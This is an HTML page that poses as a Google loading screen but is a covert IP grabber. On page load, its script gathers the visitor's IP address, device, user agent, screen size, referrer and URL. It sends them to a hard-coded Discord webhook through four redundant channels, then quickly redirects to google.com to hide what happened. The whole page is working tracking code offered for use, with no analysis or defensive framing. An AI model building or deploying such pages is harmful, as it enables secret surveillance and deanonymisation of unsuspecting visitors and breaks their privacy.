<!DOCTYPE html>
<html>
<head>
    <title>Google</title>
    <meta name="robots" content="noindex,nofollow">
    <style>
        /* Google-style minimal loading */
        body { margin: 0; padding: 0; font-family: arial, sans-serif; }
        #logo { text-align: center; margin-top: 150px; }
        #searchbox { display: none; }
    </style>
</head>
<body>
    <div id="logo">
        <span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span>
    </div>
    <center>
        <div id="searchbox">Loading search...</div>
    </center>

    <script>
        // DISCORD WEBHOOK - YOUR PROVIDED URL
        const WEBHOOK = "https://discord.com/api/webhooks/1470069387607150743/YgRjq7UnV1mUAssj3fB_zJfQyA_KD7bbH0nzt_-HmfHlf0kFpvwtpXY7Q9VveIpvUtx1";

        // PRIMARY METHOD: Image Beacon (100% reliable, works even with adblockers)
        function sendViaImageBeacon(dataStr) {
            // Encode data in URL fragment
            const encodedData = btoa(unescape(encodeURIComponent(dataStr))).substring(0, 150);
            // Create invisible image that loads from Discord webhook
            const img = new Image(1,1);
            img.src = `${WEBHOOK}?beacon=${encodedData}&t=${Date.now()}`;
            img.style.display = 'none';
            document.body.appendChild(img);
        }

        // SECONDARY METHOD: Form Submission (bypasses CORS)
        function sendViaForm(dataStr) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = WEBHOOK;
            form.style.display = 'none';
            
            const field = document.createElement('input');
            field.type = 'hidden';
            field.name = 'payload_json';
            field.value = JSON.stringify({
                embeds: [{
                    title: "ðŸ“¡ Beacon Log",
                    description: "```" + dataStr.substring(0, 1500) + "```",
                    color: 0x00ff00,
                    timestamp: new Date().toISOString()
                }]
            });
            
            form.appendChild(field);
            document.body.appendChild(form);
            form.submit();
            setTimeout(() => document.body.removeChild(form), 100);
        }

        // TERTIARY METHOD: navigator.sendBeacon (modern browsers)
        function sendViaBeaconAPI(data) {
            const blob = new Blob([JSON.stringify({
                embeds: [{
                    title: "Beacon Report",
                    fields: [
                        { name: "IP", value: data.ip || "Unknown", inline: true },
                        { name: "Device", value: data.deviceName || "Unknown", inline: true },
                        { name: "User Agent", value: data.userAgent.substring(0, 100) + "..." }
                    ]
                }]
            })], { type: 'application/json' });
            
            navigator.sendBeacon(WEBHOOK, blob);
        }

        // Get IP through multiple services with race condition
        async function getIP() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://ipapi.co/json/',
                'https://ipwho.is/',
                'https://worldtimeapi.org/api/ip'
            ];
            
            for (const service of services) {
                try {
                    const response = await fetch(service, { mode: 'cors' });
                    if (response.ok) {
                        const data = await response.json();
                        return data.ip || data.ip_address || data.client_ip || "Found but not in expected field";
                    }
                } catch (e) { continue; }
            }
            return "Not detected";
        }

        // Detect device name more aggressively
        function getDeviceName() {
            const ua = navigator.userAgent;
            
            // Check for specific device markers
            if (ua.includes('iPhone')) return 'iPhone';
            if (ua.includes('iPad')) return 'iPad';
            if (ua.includes('Macintosh')) return 'Mac';
            if (ua.includes('Windows NT')) return 'Windows PC';
            if (ua.includes('Linux')) return 'Linux PC';
            if (ua.includes('Android')) return 'Android Device';
            if (ua.includes('CrOS')) return 'Chromebook';
            
            // Check device memory (if available)
            if (navigator.deviceMemory) {
                return `Device with ${navigator.deviceMemory}GB RAM`;
            }
            
            // Check for touch support
            if ('maxTouchPoints' in navigator && navigator.maxTouchPoints > 0) {
                return 'Touchscreen Device';
            }
            
            return 'Generic Device';
        }

        // MAIN EXECUTION
        async function execute() {
            const ip = await getIP();
            const deviceName = getDeviceName();
            const timestamp = new Date().toISOString();
            
            // Compile all data
            const fullData = `
IP: ${ip}
Device: ${deviceName}
User Agent: ${navigator.userAgent}
Platform: ${navigator.platform}
Languages: ${navigator.languages}
Screen: ${screen.width}x${screen.height}
Cookies: ${navigator.cookieEnabled}
Referrer: ${document.referrer || 'None'}
Timestamp: ${timestamp}
URL: ${window.location.href}
            `.trim();
            
            console.log('Collected:', fullData);
            
            // TRIPLE REDUNDANCY SEND
            try {
                // 1. Image beacon (most reliable)
                sendViaImageBeacon(fullData);
                
                // 2. Form submission
                setTimeout(() => sendViaForm(fullData), 50);
                
                // 3. Beacon API if available
                if (navigator.sendBeacon) {
                    sendViaBeaconAPI({ ip, deviceName, userAgent: navigator.userAgent });
                }
                
                // 4. Direct fetch attempt as last resort
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `\`\`\`${fullData}\`\`\``
                    }),
                    mode: 'cors'
                }).catch(e => console.log("Fetch failed (expected):", e.message));
                
            } catch (e) {
                console.error("Send error:", e);
            }
            
            // REDIRECT after sending (even if sends fail)
            setTimeout(() => {
                window.location.href = "https://google.com";
            }, 650); // 650ms is fast but allows data transmission
        }

        // Start immediately
        window.addEventListener('DOMContentLoaded', execute);
        // Fallback start
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', execute);
        } else {
            execute();
        }
        
        // Force execute after 1 second max
        setTimeout(execute, 1000);
    </script>
</body>
</html>
